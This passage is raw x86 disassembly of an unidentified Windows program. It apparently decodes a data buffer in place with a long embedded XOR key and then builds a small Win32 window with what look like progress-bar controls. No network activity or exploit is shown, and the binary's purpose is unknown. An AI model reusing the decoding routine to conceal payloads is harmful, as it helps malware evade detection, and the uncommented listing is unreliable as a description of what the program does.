  4020f8:	c6 45 8a c9          	mov    BYTE PTR [ebp-0x76],0xc9
  4020fc:	c6 45 8b 9f          	mov    BYTE PTR [ebp-0x75],0x9f
  402100:	c6 45 8c dc          	mov    BYTE PTR [ebp-0x74],0xdc
  402104:	c6 45 8d 90          	mov    BYTE PTR [ebp-0x73],0x90
  402108:	c6 45 8e 95          	mov    BYTE PTR [ebp-0x72],0x95
  40210c:	c6 45 8f 73          	mov    BYTE PTR [ebp-0x71],0x73
  402110:	c6 45 90 01          	mov    BYTE PTR [ebp-0x70],0x1
  402114:	c6 45 91 b8          	mov    BYTE PTR [ebp-0x6f],0xb8
  402118:	c6 45 92 f8          	mov    BYTE PTR [ebp-0x6e],0xf8
  40211c:	c6 45 93 c8          	mov    BYTE PTR [ebp-0x6d],0xc8
  402120:	c6 45 94 65          	mov    BYTE PTR [ebp-0x6c],0x65
  402124:	c6 45 95 10          	mov    BYTE PTR [ebp-0x6b],0x10
  402128:	c6 45 96 22          	mov    BYTE PTR [ebp-0x6a],0x22
  40212c:	c6 45 97 1e          	mov    BYTE PTR [ebp-0x69],0x1e
  402130:	c6 45 98 45          	mov    BYTE PTR [ebp-0x68],0x45
  402134:	c6 45 99 44          	mov    BYTE PTR [ebp-0x67],0x44
  402138:	c6 45 9a 73          	mov    BYTE PTR [ebp-0x66],0x73
  40213c:	c6 45 9b b2          	mov    BYTE PTR [ebp-0x65],0xb2
  402140:	c6 45 9c f7          	mov    BYTE PTR [ebp-0x64],0xf7
  402144:	c6 45 9d 3a          	mov    BYTE PTR [ebp-0x63],0x3a
  402148:	c6 45 9e 38          	mov    BYTE PTR [ebp-0x62],0x38
  40214c:	c6 45 9f 58          	mov    BYTE PTR [ebp-0x61],0x58
  402150:	c6 45 a0 72          	mov    BYTE PTR [ebp-0x60],0x72
  402154:	c6 45 a1 f2          	mov    BYTE PTR [ebp-0x5f],0xf2
  402158:	c6 45 a2 33          	mov    BYTE PTR [ebp-0x5e],0x33
  40215c:	c6 45 a3 56          	mov    BYTE PTR [ebp-0x5d],0x56
  402160:	c6 45 a4 47          	mov    BYTE PTR [ebp-0x5c],0x47
  402164:	c6 45 a5 f7          	mov    BYTE PTR [ebp-0x5b],0xf7
  402168:	c6 45 a6 df          	mov    BYTE PTR [ebp-0x5a],0xdf
  40216c:	c6 45 a7 42          	mov    BYTE PTR [ebp-0x59],0x42
  402170:	c6 45 a8 2a          	mov    BYTE PTR [ebp-0x58],0x2a
  402174:	c6 45 a9 08          	mov    BYTE PTR [ebp-0x57],0x8
  402178:	c6 45 aa 86          	mov    BYTE PTR [ebp-0x56],0x86
  40217c:	c6 45 ab 44          	mov    BYTE PTR [ebp-0x55],0x44
  402180:	c6 45 ac 80          	mov    BYTE PTR [ebp-0x54],0x80
  402184:	c6 45 ad 28          	mov    BYTE PTR [ebp-0x53],0x28
  402188:	c6 45 ae 31          	mov    BYTE PTR [ebp-0x52],0x31
  40218c:	c6 45 af 2b          	mov    BYTE PTR [ebp-0x51],0x2b
  402190:	c6 45 b0 05          	mov    BYTE PTR [ebp-0x50],0x5
  402194:	c6 45 b1 25          	mov    BYTE PTR [ebp-0x4f],0x25
  402198:	c6 45 b2 11          	mov    BYTE PTR [ebp-0x4e],0x11
  40219c:	c6 45 b3 29          	mov    BYTE PTR [ebp-0x4d],0x29
  4021a0:	c6 45 b4 3c          	mov    BYTE PTR [ebp-0x4c],0x3c
  4021a4:	c6 45 b5 04          	mov    BYTE PTR [ebp-0x4b],0x4
  4021a8:	c6 45 b6 72          	mov    BYTE PTR [ebp-0x4a],0x72
  4021ac:	c6 45 b7 c2          	mov    BYTE PTR [ebp-0x49],0xc2
  4021b0:	c6 45 b8 4f          	mov    BYTE PTR [ebp-0x48],0x4f
  4021b4:	c6 45 b9 75          	mov    BYTE PTR [ebp-0x47],0x75
  4021b8:	c6 45 ba 52          	mov    BYTE PTR [ebp-0x46],0x52
  4021bc:	c6 45 bb b8          	mov    BYTE PTR [ebp-0x45],0xb8
  4021c0:	c6 45 bc 4f          	mov    BYTE PTR [ebp-0x44],0x4f
  4021c4:	c6 45 bd 6d          	mov    BYTE PTR [ebp-0x43],0x6d
  4021c8:	c6 45 be 95          	mov    BYTE PTR [ebp-0x42],0x95
  4021cc:	c6 45 bf 75          	mov    BYTE PTR [ebp-0x41],0x75
  4021d0:	c6 45 c0 0e          	mov    BYTE PTR [ebp-0x40],0xe
  4021d4:	c6 45 c1 0a          	mov    BYTE PTR [ebp-0x3f],0xa
  4021d8:	c6 45 c2 98          	mov    BYTE PTR [ebp-0x3e],0x98
  4021dc:	c6 45 c3 09          	mov    BYTE PTR [ebp-0x3d],0x9
  4021e0:	c6 45 c4 e9          	mov    BYTE PTR [ebp-0x3c],0xe9
  4021e4:	c6 45 c5 4e          	mov    BYTE PTR [ebp-0x3b],0x4e
  4021e8:	c6 45 c6 c9          	mov    BYTE PTR [ebp-0x3a],0xc9
  4021ec:	c6 45 c7 87          	mov    BYTE PTR [ebp-0x39],0x87
  4021f0:	c6 45 c8 fa          	mov    BYTE PTR [ebp-0x38],0xfa
  4021f4:	c6 45 c9 b1          	mov    BYTE PTR [ebp-0x37],0xb1
  4021f8:	c6 45 ca ed          	mov    BYTE PTR [ebp-0x36],0xed
  4021fc:	c6 45 cb 7b          	mov    BYTE PTR [ebp-0x35],0x7b
  402200:	c6 45 cc 92          	mov    BYTE PTR [ebp-0x34],0x92
  402204:	c6 45 cd 27          	mov    BYTE PTR [ebp-0x33],0x27
  402208:	c6 45 ce a3          	mov    BYTE PTR [ebp-0x32],0xa3
  40220c:	c6 45 cf df          	mov    BYTE PTR [ebp-0x31],0xdf
  402210:	c6 45 d0 0c          	mov    BYTE PTR [ebp-0x30],0xc
  402214:	c6 45 d1 27          	mov    BYTE PTR [ebp-0x2f],0x27
  402218:	c6 45 d2 64          	mov    BYTE PTR [ebp-0x2e],0x64
  40221c:	c6 45 d3 f1          	mov    BYTE PTR [ebp-0x2d],0xf1
  402220:	c6 45 d4 51          	mov    BYTE PTR [ebp-0x2c],0x51
  402224:	c6 45 d5 e9          	mov    BYTE PTR [ebp-0x2b],0xe9
  402228:	c6 45 d6 68          	mov    BYTE PTR [ebp-0x2a],0x68
  40222c:	c6 45 d7 ac          	mov    BYTE PTR [ebp-0x29],0xac
  402230:	c6 45 d8 a8          	mov    BYTE PTR [ebp-0x28],0xa8
  402234:	c6 45 d9 d2          	mov    BYTE PTR [ebp-0x27],0xd2
  402238:	c6 45 da 03          	mov    BYTE PTR [ebp-0x26],0x3
  40223c:	c6 45 db f3          	mov    BYTE PTR [ebp-0x25],0xf3
  402240:	c6 45 dc da          	mov    BYTE PTR [ebp-0x24],0xda
  402244:	c6 45 dd 2e          	mov    BYTE PTR [ebp-0x23],0x2e
  402248:	c6 45 de 68          	mov    BYTE PTR [ebp-0x22],0x68
  40224c:	c6 45 df 7a          	mov    BYTE PTR [ebp-0x21],0x7a
  402250:	c6 45 e0 84          	mov    BYTE PTR [ebp-0x20],0x84
  402254:	c6 45 e1 7c          	mov    BYTE PTR [ebp-0x1f],0x7c
  402258:	c6 45 e2 74          	mov    BYTE PTR [ebp-0x1e],0x74
  40225c:	c6 45 e3 89          	mov    BYTE PTR [ebp-0x1d],0x89
  402260:	c6 45 e4 54          	mov    BYTE PTR [ebp-0x1c],0x54
  402264:	c6 45 e5 c4          	mov    BYTE PTR [ebp-0x1b],0xc4
  402268:	c6 45 e6 d7          	mov    BYTE PTR [ebp-0x1a],0xd7
  40226c:	c6 45 e7 0e          	mov    BYTE PTR [ebp-0x19],0xe
  402270:	c6 45 e8 db          	mov    BYTE PTR [ebp-0x18],0xdb
  402274:	c6 45 e9 7f          	mov    BYTE PTR [ebp-0x17],0x7f
  402278:	c6 45 ea d9          	mov    BYTE PTR [ebp-0x16],0xd9
  40227c:	c6 45 eb 6f          	mov    BYTE PTR [ebp-0x15],0x6f
  402280:	89 4d fc             	mov    DWORD PTR [ebp-0x4],ecx
  402283:	33 ff                	xor    edi,edi
  402285:	89 bd 18 fd ff ff    	mov    DWORD PTR [ebp-0x2e8],edi
  40228b:	3b 7d 0c             	cmp    edi,DWORD PTR [ebp+0xc]
  40228e:	73 3c                	jae    0x4022cc
  402290:	89 4d ec             	mov    DWORD PTR [ebp-0x14],ecx
  402293:	81 7d ec d0 02 00 00 	cmp    DWORD PTR [ebp-0x14],0x2d0
  40229a:	73 2d                	jae    0x4022c9
  40229c:	8b 45 08             	mov    eax,DWORD PTR [ebp+0x8]
  40229f:	8d 34 07             	lea    esi,[edi+eax*1]
  4022a2:	8b c7                	mov    eax,edi
  4022a4:	33 d2                	xor    edx,edx
  4022a6:	bb d0 02 00 00       	mov    ebx,0x2d0
  4022ab:	f7 f3                	div    ebx
  4022ad:	0f b6 84 15 1c fd ff 	movzx  eax,BYTE PTR [ebp+edx*1-0x2e4]
  4022b4:	ff 
  4022b5:	8b 55 ec             	mov    edx,DWORD PTR [ebp-0x14]
  4022b8:	0f af d7             	imul   edx,edi
  4022bb:	03 c2                	add    eax,edx
  4022bd:	0f b6 16             	movzx  edx,BYTE PTR [esi]
  4022c0:	33 c2                	xor    eax,edx
  4022c2:	88 06                	mov    BYTE PTR [esi],al
  4022c4:	ff 45 ec             	inc    DWORD PTR [ebp-0x14]
  4022c7:	eb ca                	jmp    0x402293
  4022c9:	47                   	inc    edi
  4022ca:	eb b9                	jmp    0x402285
  4022cc:	83 4d fc ff          	or     DWORD PTR [ebp-0x4],0xffffffff
  4022d0:	8b 4d f4             	mov    ecx,DWORD PTR [ebp-0xc]
  4022d3:	64 89 0d 00 00 00 00 	mov    DWORD PTR fs:0x0,ecx
  4022da:	5f                   	pop    edi
  4022db:	5e                   	pop    esi
  4022dc:	5b                   	pop    ebx
  4022dd:	c9                   	leave
  4022de:	c3                   	ret
  4022df:	83 4d fc ff          	or     DWORD PTR [ebp-0x4],0xffffffff
  4022e3:	b8 d0 22 40 00       	mov    eax,0x4022d0
  4022e8:	c3                   	ret
  4022e9:	8b 44 24 08          	mov    eax,DWORD PTR [esp+0x8]
  4022ed:	2d 10 01 00 00       	sub    eax,0x110
  4022f2:	74 22                	je     0x402316
  4022f4:	48                   	dec    eax
  4022f5:	74 04                	je     0x4022fb
  4022f7:	33 c0                	xor    eax,eax
  4022f9:	eb 1e                	jmp    0x402319
  4022fb:	0f b7 44 24 0c       	movzx  eax,WORD PTR [esp+0xc]
  402300:	48                   	dec    eax
  402301:	74 07                	je     0x40230a
  402303:	48                   	dec    eax
  402304:	75 10                	jne    0x402316
  402306:	6a 02                	push   0x2
  402308:	eb 02                	jmp    0x40230c
  40230a:	6a 01                	push   0x1
  40230c:	ff 74 24 08          	push   DWORD PTR [esp+0x8]
  402310:	ff 15 6c 11 42 00    	call   DWORD PTR ds:0x42116c
  402316:	33 c0                	xor    eax,eax
  402318:	40                   	inc    eax
  402319:	c2 10 00             	ret    0x10
  40231c:	83 ec 50             	sub    esp,0x50
  40231f:	53                   	push   ebx
  402320:	55                   	push   ebp
  402321:	8b 6c 24 5c          	mov    ebp,DWORD PTR [esp+0x5c]
  402325:	56                   	push   esi
  402326:	8b 35 88 11 42 00    	mov    esi,DWORD PTR ds:0x421188
  40232c:	57                   	push   edi
  40232d:	bf f4 01 00 00       	mov    edi,0x1f4
  402332:	57                   	push   edi
  402333:	bb 08 4c 48 00       	mov    ebx,0x484c08
  402338:	55                   	push   ebp
  402339:	89 6c 24 4c          	mov    DWORD PTR [esp+0x4c],ebp
  40233d:	89 5c 24 60          	mov    DWORD PTR [esp+0x60],ebx
  402341:	c7 44 24 40 47 27 40 	mov    DWORD PTR [esp+0x40],0x402747
  402348:	00 
  402349:	c7 44 24 3c 08 00 00 	mov    DWORD PTR [esp+0x3c],0x8
  402350:	00 
  402351:	c7 44 24 38 30 00 00 	mov    DWORD PTR [esp+0x38],0x30
  402358:	00 
  402359:	ff d6                	call   esi
  40235b:	57                   	push   edi
  40235c:	55                   	push   ebp
  40235d:	89 44 24 50          	mov    DWORD PTR [esp+0x50],eax
  402361:	ff d6                	call   esi
  402363:	68 00 7f 00 00       	push   0x7f00
  402368:	33 ff                	xor    edi,edi
  40236a:	57                   	push   edi
  40236b:	89 44 24 64          	mov    DWORD PTR [esp+0x64],eax
  40236f:	ff 15 b8 11 42 00    	call   DWORD PTR ds:0x4211b8
  402375:	8b 35 08 10 42 00    	mov    esi,DWORD PTR ds:0x421008
  40237b:	6a 01                	push   0x1
  40237d:	89 44 24 50          	mov    DWORD PTR [esp+0x50],eax
  402381:	89 7c 24 58          	mov    DWORD PTR [esp+0x58],edi
  402385:	89 7c 24 40          	mov    DWORD PTR [esp+0x40],edi
  402389:	89 7c 24 44          	mov    DWORD PTR [esp+0x44],edi
  40238d:	ff d6                	call   esi
  40238f:	89 44 24 50          	mov    DWORD PTR [esp+0x50],eax
  402393:	8d 44 24 30          	lea    eax,[esp+0x30]
  402397:	50                   	push   eax
  402398:	ff 15 98 11 42 00    	call   DWORD PTR ds:0x421198
  40239e:	66 85 c0             	test   ax,ax
  4023a1:	75 07                	jne    0x4023aa
  4023a3:	33 c0                	xor    eax,eax
  4023a5:	e9 93 03 00 00       	jmp    0x40273d
  4023aa:	57                   	push   edi
  4023ab:	55                   	push   ebp
  4023ac:	8b 2d 70 11 42 00    	mov    ebp,DWORD PTR ds:0x421170
  4023b2:	57                   	push   edi
  4023b3:	57                   	push   edi
  4023b4:	68 0e 01 00 00       	push   0x10e
  4023b9:	68 f0 00 00 00       	push   0xf0
  4023be:	b8 00 00 00 80       	mov    eax,0x80000000
  4023c3:	50                   	push   eax
  4023c4:	50                   	push   eax
  4023c5:	68 00 00 cf 00       	push   0xcf0000
  4023ca:	68 54 24 42 00       	push   0x422454
  4023cf:	53                   	push   ebx
  4023d0:	57                   	push   edi
  4023d1:	ff d5                	call   ebp
  4023d3:	57                   	push   edi
  4023d4:	6a 11                	push   0x11
  4023d6:	8b d8                	mov    ebx,eax
  4023d8:	ff d6                	call   esi
  4023da:	8b 35 80 11 42 00    	mov    esi,DWORD PTR ds:0x421180
  4023e0:	50                   	push   eax
  4023e1:	6a 30                	push   0x30
  4023e3:	53                   	push   ebx
  4023e4:	ff d6                	call   esi
  4023e6:	57                   	push   edi
  4023e7:	6a fa                	push   0xfffffffa
  4023e9:	53                   	push   ebx
  4023ea:	ff 15 74 11 42 00    	call   DWORD PTR ds:0x421174
  4023f0:	50                   	push   eax
  4023f1:	57                   	push   edi
  4023f2:	53                   	push   ebx
  4023f3:	6a 14                	push   0x14
  4023f5:	6a 64                	push   0x64
  4023f7:	6a 02                	push   0x2
  4023f9:	6a 7d                	push   0x7d
  4023fb:	68 80 00 80 50       	push   0x50800080
  402400:	b8 5c 24 42 00       	mov    eax,0x42245c
  402405:	50                   	push   eax
  402406:	50                   	push   eax
  402407:	57                   	push   edi
  402408:	ff d5                	call   ebp
  40240a:	57                   	push   edi
  40240b:	50                   	push   eax
  40240c:	a3 18 57 48 00       	mov    ds:0x485718,eax
  402411:	ff 15 c0 11 42 00    	call   DWORD PTR ds:0x4211c0
  402417:	57                   	push   edi
  402418:	6a 11                	push   0x11
  40241a:	ff 15 08 10 42 00    	call   DWORD PTR ds:0x421008
  402420:	50                   	push   eax
  402421:	6a 30                	push   0x30
  402423:	ff 35 18 57 48 00    	push   DWORD PTR ds:0x485718
  402429:	ff d6                	call   esi
  40242b:	57                   	push   edi
  40242c:	6a fa                	push   0xfffffffa
  40242e:	53                   	push   ebx
  40242f:	ff 15 74 11 42 00    	call   DWORD PTR ds:0x421174
  402435:	50                   	push   eax
  402436:	57                   	push   edi
  402437:	53                   	push   ebx
  402438:	6a 14                	push   0x14
  40243a:	6a 64                	push   0x64
  40243c:	6a 19                	push   0x19
  40243e:	6a 7d                	push   0x7d
  402440:	68 cf 00 80 50       	push   0x508000cf
  402445:	b8 5c 24 42 00       	mov    eax,0x42245c
  40244a:	50                   	push   eax
  40244b:	50                   	push   eax
  40244c:	57                   	push   edi
  40244d:	ff d5                	call   ebp
  40244f:	57                   	push   edi
  402450:	50                   	push   eax
  402451:	a3 ec 56 48 00       	mov    ds:0x4856ec,eax
  402456:	ff 15 c0 11 42 00    	call   DWORD PTR ds:0x4211c0
  40245c:	57                   	push   edi
  40245d:	6a 11                	push   0x11
  40245f:	ff 15 08 10 42 00    	call   DWORD PTR ds:0x421008
  402465:	50                   	push   eax
  402466:	6a 30                	push   0x30
  402468:	ff 35 ec 56 48 00    	push   DWORD PTR ds:0x4856ec
  40246e:	ff d6                	call   esi
  402470:	57                   	push   edi
  402471:	6a fa                	push   0xfffffffa
  402473:	53                   	push   ebx
  402474:	ff 15 74 11 42 00    	call   DWORD PTR ds:0x421174
  40247a:	50                   	push   eax
  40247b:	68 2c 01 00 00       	push   0x12c
  402480:	53                   	push   ebx
  402481:	6a 19                	push   0x19
  402483:	6a 64                	push   0x64
  402485:	6a 69                	push   0x69
  402487:	6a 3c                	push   0x3c
  402489:	68 00 00 00 50       	push   0x50000000
  40248e:	68 64 24 42 00       	push   0x422464
  402493:	68 6c 24 42 00       	push   0x42246c
  402498:	57                   	push   edi
  402499:	ff d5                	call   ebp
  40249b:	57                   	push   edi
  40249c:	50                   	push   eax
  40249d:	89 44 24 18          	mov    DWORD PTR [esp+0x18],eax
  4024a1:	ff 15 c0 11 42 00    	call   DWORD PTR ds:0x4211c0
  4024a7:	57                   	push   edi
  4024a8:	6a 11                	push   0x11
  4024aa:	ff 15 08 10 42 00    	call   DWORD PTR ds:0x421008
  4024b0:	50                   	push   eax
  4024b1:	6a 30                	push   0x30
  4024b3:	ff 74 24 1c          	push   DWORD PTR [esp+0x1c]
  4024b7:	ff d6                	call   esi
  4024b9:	57                   	push   edi
  4024ba:	6a fa                	push   0xfffffffa
  4024bc:	53                   	push   ebx
  4024bd:	ff 15 74 11 42 00    	call   DWORD PTR ds:0x421174
  4024c3:	50                   	push   eax
  4024c4:	57                   	push   edi
  4024c5:	53                   	push   ebx
  4024c6:	6a 14                	push   0x14
  4024c8:	6a 64                	push   0x64
  4024ca:	6a 32                	push   0x32
  4024cc:	6a 7d                	push   0x7d
  4024ce:	68 80 00 80 50       	push   0x50800080
  4024d3:	b8 5c 24 42 00       	mov    eax,0x42245c
  4024d8:	50                   	push   eax
  4024d9:	50                   	push   eax
  4024da:	57                   	push   edi
  4024db:	ff d5                	call   ebp
  4024dd:	57                   	push   edi
  4024de:	50                   	push   eax
  4024df:	a3 e8 56 48 00       	mov    ds:0x4856e8,eax
  4024e4:	ff 15 c0 11 42 00    	call   DWORD PTR ds:0x4211c0
  4024ea:	57                   	push   edi
  4024eb:	6a 11                	push   0x11
  4024ed:	ff 15 08 10 42 00    	call   DWORD PTR ds:0x421008
  4024f3:	50                   	push   eax
  4024f4:	6a 30                	push   0x30
  4024f6:	ff 35 e8 56 48 00    	push   DWORD PTR ds:0x4856e8
  4024fc:	ff d6                	call   esi
  4024fe:	57                   	push   edi
  4024ff:	6a fa                	push   0xfffffffa
  402501:	53                   	push   ebx
  402502:	ff 15 74 11 42 00    	call   DWORD PTR ds:0x421174
  402508:	50                   	push   eax
  402509:	57                   	push   edi
  40250a:	53                   	push   ebx
  40250b:	6a 14                	push   0x14
  40250d:	6a 64                	push   0x64
  40250f:	6a 4b                	push   0x4b
  402511:	6a 7d                	push   0x7d
  402513:	68 80 00 80 50       	push   0x50800080
  402518:	b8 5c 24 42 00       	mov    eax,0x42245c
  40251d:	50                   	push   eax
  40251e:	50                   	push   eax
  40251f:	57                   	push   edi
  402520:	ff d5                	call   ebp
  402522:	57                   	push   edi
  402523:	50                   	push   eax
  402524:	a3 10 57 48 00       	mov    ds:0x485710,eax
  402529:	ff 15 c0 11 42 00    	call   DWORD PTR ds:0x4211c0
  40252f:	57                   	push   edi
  402530:	6a 11                	push   0x11
  402532:	ff 15 08 10 42 00    	call   DWORD PTR ds:0x421008
  402538:	50                   	push   eax
  402539:	6a 30                	push   0x30
  40253b:	ff 35 10 57 48 00    	push   DWORD PTR ds:0x485710
  402541:	ff d6                	call   esi
  402543:	57                   	push   edi
  402544:	53                   	push   ebx
  402545:	ff 15 c0 11 42 00    	call   DWORD PTR ds:0x4211c0
  40254b:	68 f5 01 00 00       	push   0x1f5
  402550:	ff 74 24 68          	push   DWORD PTR [esp+0x68]
  402554:	ff 15 8c 11 42 00    	call   DWORD PTR ds:0x42118c
  40255a:	50                   	push   eax
  40255b:	53                   	push   ebx
  40255c:	ff 15 ac 11 42 00    	call   DWORD PTR ds:0x4211ac
  402562:	57                   	push   edi
  402563:	57                   	push   edi
  402564:	68 2d 01 00 00       	push   0x12d
  402569:	53                   	push   ebx
  40256a:	6a 0f                	push   0xf
  40256c:	68 e6 00 00 00       	push   0xe6
  402571:	68 96 00 00 00       	push   0x96
  402576:	57                   	push   edi
  402577:	68 00 00 00 50       	push   0x50000000
  40257c:	57                   	push   edi
  40257d:	68 74 24 42 00       	push   0x422474
  402582:	57                   	push   edi
  402583:	ff d5                	call   ebp
  402585:	68 00 00 64 00       	push   0x640000
  40258a:	57                   	push   edi
  40258b:	68 01 04 00 00       	push   0x401
  402590:	50                   	push   eax
  402591:	a3 14 57 48 00       	mov    ds:0x485714,eax
  402596:	ff d6                	call   esi
  402598:	57                   	push   edi
  402599:	6a 01                	push   0x1
  40259b:	68 04 04 00 00       	push   0x404
  4025a0:	ff 35 14 57 48 00    	push   DWORD PTR ds:0x485714
  4025a6:	ff d6                	call   esi
  4025a8:	57                   	push   edi
  4025a9:	68 e8 03 00 00       	push   0x3e8
  4025ae:	6a 01                	push   0x1
  4025b0:	53                   	push   ebx
  4025b1:	ff 15 9c 11 42 00    	call   DWORD PTR ds:0x42119c
  4025b7:	57                   	push   edi
  4025b8:	57                   	push   edi
  4025b9:	68 2e 01 00 00       	push   0x12e
  4025be:	53                   	push   ebx
  4025bf:	6a 1e                	push   0x1e
  4025c1:	68 c8 00 00 00       	push   0xc8
  4025c6:	68 af 00 00 00       	push   0xaf
  4025cb:	6a 0a                	push   0xa
  4025cd:	68 21 00 00 50       	push   0x50000021
  4025d2:	68 88 24 42 00       	push   0x422488
  4025d7:	68 9c 24 42 00       	push   0x42249c
  4025dc:	57                   	push   edi
  4025dd:	ff d5                	call   ebp
  4025df:	68 00 00 64 00       	push   0x640000
  4025e4:	6a 01                	push   0x1
  4025e6:	68 06 04 00 00       	push   0x406
  4025eb:	50                   	push   eax
  4025ec:	89 44 24 74          	mov    DWORD PTR [esp+0x74],eax
  4025f0:	ff d6                	call   esi
  4025f2:	6a 04                	push   0x4
  4025f4:	57                   	push   edi
  4025f5:	68 15 04 00 00       	push   0x415
  4025fa:	ff 74 24 70          	push   DWORD PTR [esp+0x70]
  4025fe:	ff d6                	call   esi
  402600:	57                   	push   edi
  402601:	57                   	push   edi
  402602:	68 0a 04 00 00       	push   0x40a
  402607:	ff 74 24 70          	push   DWORD PTR [esp+0x70]
  40260b:	ff d6                	call   esi
  40260d:	6a 32                	push   0x32
  40260f:	6a 01                	push   0x1
  402611:	68 05 04 00 00       	push   0x405
  402616:	ff 74 24 70          	push   DWORD PTR [esp+0x70]
  40261a:	ff d6                	call   esi
  40261c:	ff 74 24 64          	push   DWORD PTR [esp+0x64]
  402620:	ff 15 84 11 42 00    	call   DWORD PTR ds:0x421184
  402626:	57                   	push   edi
  402627:	6a fa                	push   0xfffffffa
  402629:	53                   	push   ebx
  40262a:	ff 15 74 11 42 00    	call   DWORD PTR ds:0x421174
  402630:	50                   	push   eax
  402631:	57                   	push   edi
  402632:	53                   	push   ebx
  402633:	6a 14                	push   0x14
  402635:	6a 64                	push   0x64
  402637:	6a 02                	push   0x2
  402639:	6a 02                	push   0x2
  40263b:	68 00 00 00 50       	push   0x50000000
  402640:	68 b0 24 42 00       	push   0x4224b0
  402645:	68 c4 24 42 00       	push   0x4224c4
  40264a:	57                   	push   edi
  40264b:	ff d5                	call   ebp
  40264d:	57                   	push   edi
  40264e:	6a 11                	push   0x11
  402650:	89 44 24 6c          	mov    DWORD PTR [esp+0x6c],eax
  402654:	ff 15 08 10 42 00    	call   DWORD PTR ds:0x421008
  40265a:	50                   	push   eax
  40265b:	6a 30                	push   0x30
  40265d:	ff 74 24 70          	push   DWORD PTR [esp+0x70]
  402661:	ff d6                	call   esi
  402663:	57                   	push   edi
  402664:	6a fa                	push   0xfffffffa
  402666:	53                   	push   ebx
  402667:	ff 15 74 11 42 00    	call   DWORD PTR ds:0x421174
  40266d:	50                   	push   eax
  40266e:	57                   	push   edi
  40266f:	53                   	push   ebx
  402670:	6a 14                	push   0x14
  402672:	6a 64                	push   0x64
  402674:	6a 19                	push   0x19
  402676:	6a 02                	push   0x2
  402678:	68 00 00 00 50       	push   0x50000000
  40267d:	68 cc 24 42 00       	push   0x4224cc
  402682:	68 c4 24 42 00       	push   0x4224c4
  402687:	57                   	push   edi
  402688:	ff d5                	call   ebp
  40268a:	57                   	push   edi
  40268b:	6a 11                	push   0x11
  40268d:	89 44 24 6c          	mov    DWORD PTR [esp+0x6c],eax
  402691:	ff 15 08 10 42 00    	call   DWORD PTR ds:0x421008
  402697:	50                   	push   eax
  402698:	6a 30                	push   0x30
  40269a:	ff 74 24 70          	push   DWORD PTR [esp+0x70]
  40269e:	ff d6                	call   esi
  4026a0:	57                   	push   edi
  4026a1:	6a fa                	push   0xfffffffa
  4026a3:	53                   	push   ebx
  4026a4:	ff 15 74 11 42 00    	call   DWORD PTR ds:0x421174
  4026aa:	50                   	push   eax
  4026ab:	57                   	push   edi
  4026ac:	53                   	push   ebx
  4026ad:	6a 14                	push   0x14
  4026af:	6a 64                	push   0x64
  4026b1:	6a 32                	push   0x32
  4026b3:	6a 02                	push   0x2
  4026b5:	68 00 00 00 50       	push   0x50000000
  4026ba:	68 dc 24 42 00       	push   0x4224dc
  4026bf:	68 c4 24 42 00       	push   0x4224c4
  4026c4:	57                   	push   edi
  4026c5:	ff d5                	call   ebp
  4026c7:	57                   	push   edi
  4026c8:	6a 11                	push   0x11
  4026ca:	89 44 24 6c          	mov    DWORD PTR [esp+0x6c],eax
  4026ce:	ff 15 08 10 42 00    	call   DWORD PTR ds:0x421008
  4026d4:	50                   	push   eax
  4026d5:	6a 30                	push   0x30
  4026d7:	ff 74 24 70          	push   DWORD PTR [esp+0x70]
  4026db:	ff d6                	call   esi
  4026dd:	57                   	push   edi
  4026de:	6a fa                	push   0xfffffffa
  4026e0:	53                   	push   ebx
  4026e1:	ff 15 74 11 42 00    	call   DWORD PTR ds:0x421174
  4026e7:	50                   	push   eax
  4026e8:	57                   	push   edi
  4026e9:	53                   	push   ebx
  4026ea:	6a 14                	push   0x14
  4026ec:	6a 64                	push   0x64
  4026ee:	6a 4b                	push   0x4b
  4026f0:	6a 02                	push   0x2
  4026f2:	68 00 00 00 50       	push   0x50000000
  4026f7:	68 ec 24 42 00       	push   0x4224ec
  4026fc:	68 c4 24 42 00       	push   0x4224c4
  402701:	57                   	push   edi
  402702:	ff d5                	call   ebp
  402704:	57                   	push   edi
  402705:	6a 11                	push   0x11
  402707:	8b d8                	mov    ebx,eax
  402709:	ff 15 08 10 42 00    	call   DWORD PTR ds:0x421008
  40270f:	50                   	push   eax
  402710:	6a 30                	push   0x30
  402712:	53                   	push   ebx
  402713:	ff d6                	call   esi
  402715:	57                   	push   edi
  402716:	57                   	push   edi
  402717:	57                   	push   edi
  402718:	8d 44 24 20          	lea    eax,[esp+0x20]
  40271c:	50                   	push   eax
  40271d:	ff 15 a0 11 42 00    	call   DWORD PTR ds:0x4211a0
  402723:	8d 44 24 14          	lea    eax,[esp+0x14]
  402727:	50                   	push   eax
  402728:	ff 15 7c 11 42 00    	call   DWORD PTR ds:0x42117c
  40272e:	8d 44 24 14          	lea    eax,[esp+0x14]
  402732:	50                   	push   eax
  402733:	ff 15 b0 11 42 00    	call   DWORD PTR ds:0x4211b0
  402739:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
  40273d:	5f                   	pop    edi
  40273e:	5e                   	pop    esi
  40273f:	5d                   	pop    ebp
  402740:	5b                   	pop    ebx
  402741:	83 c4 50             	add    esp,0x50
  402744:	c2 04 00             	ret    0x4
  402747:	55                   	push   ebp
  402748:	8b ec                	mov    ebp,esp
  40274a:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
  40274d:	48                   	dec    eax
  40274e:	48                   	dec    eax
  40274f:	56                   	push   esi
  402750:	0f 84 04 01 00 00    	je     0x40285a
  402756:	2d 0f 01 00 00       	sub    eax,0x10f
  40275b:	74 45                	je     0x4027a2
  40275d:	48                   	dec    eax
  40275e:	48                   	dec    eax
  40275f:	74 08                	je     0x402769
  402761:	5e                   	pop    esi
  402762:	5d                   	pop    ebp
  402763:	ff 25 68 11 42 00    	jmp    DWORD PTR ds:0x421168
  402769:	8b 35 b4 11 42 00    	mov    esi,DWORD PTR ds:0x4211b4
  40276f:	57                   	push   edi
  402770:	bf a8 25 42 00       	mov    edi,0x4225a8
  402775:	57                   	push   edi
  402776:	ff 35 ec 56 48 00    	push   DWORD PTR ds:0x4856ec
  40277c:	ff d6                	call   esi
  40277e:	57                   	push   edi
  40277f:	ff 35 18 57 48 00    	push   DWORD PTR ds:0x485718
  402785:	ff d6                	call   esi
  402787:	6a 00                	push   0x0
  402789:	6a 00                	push   0x0
  40278b:	68 05 04 00 00       	push   0x405
  402790:	ff 35 14 57 48 00    	push   DWORD PTR ds:0x485714
  402796:	ff 15 80 11 42 00    	call   DWORD PTR ds:0x421180
  40279c:	5f                   	pop    edi
  40279d:	e9 cb 00 00 00       	jmp    0x40286d
  4027a2:	8b 45 10             	mov    eax,DWORD PTR [ebp+0x10]
